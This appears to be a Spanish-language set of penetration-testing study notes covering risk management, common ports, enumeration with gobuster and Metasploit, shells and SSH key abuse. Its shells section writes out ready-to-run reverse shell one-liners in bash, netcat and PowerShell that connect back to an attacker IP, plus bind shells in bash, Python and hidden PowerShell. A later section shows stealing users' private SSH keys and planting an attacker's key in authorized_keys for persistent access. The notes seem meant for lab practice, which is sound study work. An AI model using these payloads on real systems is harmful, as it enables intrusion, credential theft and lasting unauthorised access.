
**CIA TRIAD** --> confidentiality, integrity, and availability of data

**Risk management process**:

| Step                    | Explanation                                                                                                                               |
| ----------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `Identificar el riesgo` | Identificar los riesgos a los que está expuesto el negocio: legal, environmental, de mercado, regulatorio etc.                            |
| `Analizarlo`            | Analizar para saber impacto y probabilidad. Los riesgos tendrán que ser mapeados a las políticas, procedimientos, y procesos del negocio. |
| `Evaluarlo`             | Evaluar, rankear y priorizar riesgos. Se tiene que elegir aceptar, evitar, mitigar, o delegar.                                            |
| `Tratarlo`              | Eliminar o contener. Esto incluye interferir con todo lo que pueda suponer cualquier riesgo                                               |
| `Monitorizarlo`         | Todos los riesgos tienen que estar continuamente monitorizados, y rankeados según el daño que puedan causar.                              |

**Puertos**

| Puerto (Protocolo) | Servicio              |
| ------------------ | --------------------- |
| `20`/`21` (TCP)    | `FTP`                 |
| `22` (TCP)         | `SSH`                 |
| `23` (TCP)         | `Telnet`              |
| `25` (TCP)         | `SMTP`                |
| `80` (TCP)         | `HTTP`                |
| `88 (TCP)`         | `Kerberos`            |
| `161` (TCP/UDP)    | `SNMP`                |
| `389` (TCP/UDP)    | `LDAP`                |
| `443` (TCP)        | `SSL`/`TLS` (`HTTPS`) |
| `445` (TCP)        | `SMB`                 |
| `3389` (TCP)       | `RDP`                 |

https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

**VIM**

|Command|Description|
|---|---|
|`x`|Cut character|
|`dw`|Cut word|
|`dd`|Cut full line|
|`yw`|Copy word|
|`yy`|Copy full line|
|`p`|Paste|

En FTP: cd, ls, get

SMB:
smbclient -N (no pedir contraseña) -L listar shares -U (user) ||| get 


**Enumeration con gobuster**

banner --> nc -nv ip port
```shell
gobuster dir -u http://10.10.10.121/ -w diccionario
```
Para directorios, podemos usar
```shell
gobuster dns -d dominio.com -w diccionario
```

El robots.txt puede dar información valiosa. Se ve el source con ctrl+u

Para encontrar exploits, se puede usar searchsploit (exploit-db), o 'search exploit' en msf
Para seleccionar el exploit en msf, 'use nombre_exploit'
Para ver las opciones en el exploit, 'show options'
Para configurarlo, 'set OPCION param'
RHOST = Target
LHOST = Attacker/Interfaz de red

Con todo configurado, se puede usar 'check' para comprobar que la víctima es vulnerable, y, para usar el exploit, 'run' | 'exploit'

## Shells

### Reverse Shell

Una **reverse shell** establece una conexión desde el sistema comprometido hacia el atacante. El atacante abre un listener en su máquina y la víctima inicia la conexión, proporcionando acceso remoto.

**Características**:
- El atacante debe estar escuchando (listener)
- La víctima inicia la conexión hacia el atacante
- Útil cuando el atacante está en una red diferente
- Más fácil de eludir firewalls (conexión saliente)
- Requiere conocer la IP del atacante

**Configuración**:

En la máquina atacante (listener):
```bash
nc -lvnp 1234
```

En la víctima, ejecutar uno de estos comandos:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Referencia completa: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

### Bind Shell

Una **bind shell** hace que el sistema comprometido escuche en un puerto esperando conexiones. El atacante se conecta hacia el puerto abierto en la máquina objetivo.

**Características**:
- La víctima abre un listener en su máquina
- El atacante inicia la conexión hacia la víctima
- Requiere que la víctima esté accesible desde el exterior
- Más fácil de detectar (puerto abierto esperando conexiones)
- No requiere conocer la IP del atacante de antemano
- Ideal cuando la víctima tiene acceso a internet saliente pero el atacante está detrás de firewall

**Configuración**:

En la víctima (abre el listener):
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

En la máquina atacante (conectarse):
```bash
nc 10.10.10.1 1234
```

Referencia completa: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/


### Tratamiento de la TTY
```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

ctrl+z para el background, 
```shell
stty raw -echo
fg
```

Luego tenemos que pasarle nuestro $TERM con 'export TERM'
y nuestro tamaño (stty size) con 'stty rows num columns num'



## SSH Keys

### Método 1: Utilizar claves privadas existentes

Si se consigue acceso al sistema y se encuentra una clave privada en `/home/user/.ssh/` o `/root/.ssh/`, es posible reutilizarla para conectarse por SSH remotamente:

```bash
# Descargar la clave privada (id_rsa)
scp user@target:/home/user/.ssh/id_rsa ./id_rsa

# Conectarse usando esa clave
ssh -i id_rsa user@target_ip
```

**Nota**: Las claves privadas suelen tener permisos restrictivos (600), puede ser necesario ajustarlos:
```bash
chmod 600 id_rsa
```

### Método 2: Inyectar nuevas claves públicas

Si se tiene acceso al directorio `~/.ssh/` del usuario objetivo, se puede inyectar la clave pública propia en el archivo `authorized_keys` para mantener acceso futuro:

**En la máquina atacante**:
```bash
# Generar un nuevo par de claves
ssh-keygen -f key -t rsa -N ""

# Esto generará:
# - key (clave privada)
# - key.pub (clave pública)
```

**En el sistema objetivo**:
```bash
# Añadir la clave pública al archivo authorized_keys
echo "contenido_de_key.pub" >> ~/.ssh/authorized_keys

# O subirla directamente:
scp key.pub user@target:/home/user/.ssh/authorized_keys
```

**Conectarse desde la máquina atacante**:
```bash
ssh -i key user@target_ip
```
## Privesc
https://book.hacktricks.wiki/en/index.html
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

